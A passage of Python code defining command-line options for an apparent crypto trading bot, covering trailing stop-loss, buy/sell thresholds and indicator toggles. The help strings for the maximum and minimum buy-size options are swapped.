        parser.add_argument("--profitbankreversal", type=int, help="Sell at candlestick strong reversal pattern")

        parser.add_argument("--trailingstoploss", type=float, help="Percentage below the trade margin high to sell")
        parser.add_argument("--trailingstoplosstrigger", type=float, help="Trade margin percentage to enable the trailing stop loss")
        parser.add_argument("--trailingsellpcnt", type=float, help="Percentage of decrease to wait before selling")
        parser.add_argument("--trailingimmediatesell", action="store_true", help="Immediate sell if trailing sell percent is reached")
        parser.add_argument("--trailingsellimmediatepcnt", type=float, help="Percentage of decrease used with a strong sell signal")
        parser.add_argument("--trailingsellbailoutpcnt", type=float, help="Percentage of decrease to bailout, sell immediately")

        parser.add_argument("--dynamictsl", type=int, help="Dynamic Trailing Stop Loss (TSL)")
        parser.add_argument("--tslmultiplier", type=float, help="Please refer to the detailed explanation in the README.md")
        parser.add_argument("--tsltriggermultiplier", type=float, help="Please refer to the detailed explanation in the README.md")
        parser.add_argument("--tslmaxpcnt", type=float, help="Please refer to the detailed explanation in the README.md")

        parser.add_argument("--buymaxsize", type=float, help="Minimum buy order size in quote currency")
        parser.add_argument("--buyminsize", type=float, help="Maximum buy order size in quote currency")
        parser.add_argument("--buylastsellsize", type=int, help="Next buy order will match last sell order")
        parser.add_argument("--trailingbuypcnt", type=float, help="Percentage of increase to wait before buying")
        parser.add_argument("--trailingimmediatebuy", action="store_true", help="Immediate buy if trailing buy percent is reached")
        parser.add_argument("--trailingbuyimmediatepcnt", type=float, help="Percent of increase to trigger immediate buy")
        parser.add_argument("--marketmultibuycheck", action="store_true", help="Additional check for market multiple buys")

        parser.add_argument("--buynearhigh", type=int, help="Prevent the bot from buying at a recent high")
        parser.add_argument("--buynearhighpcnt", type=float, help="Percentage from the range high to not buy")

        parser.add_argument("--selltriggeroverride", action="store_true", help="Override sell trigger if strong buy")

        parser.add_argument("--ema1226", type=int, help="Enable EMA12/EMA26 crossovers")
        parser.add_argument("--macdsignal", type=int, help="Enable MACD/Signal crossovers")
        parser.add_argument("--obv", type=int, help="Enable On-Balance Volume (OBV)")
        parser.add_argument("--elderray", type=int, help="Enable Elder-Ray Indices")
        parser.add_argument("--bbands_s1", type=int, help="Enable Bollinger Bands - Strategy 1")
        parser.add_argument("--bbands_s2", type=int, help="Enable Bollinger Bands - Strategy 2")

        # pylint: disable=unused-variable
        args, unknown = parser.parse_known_args()
        return vars(args)
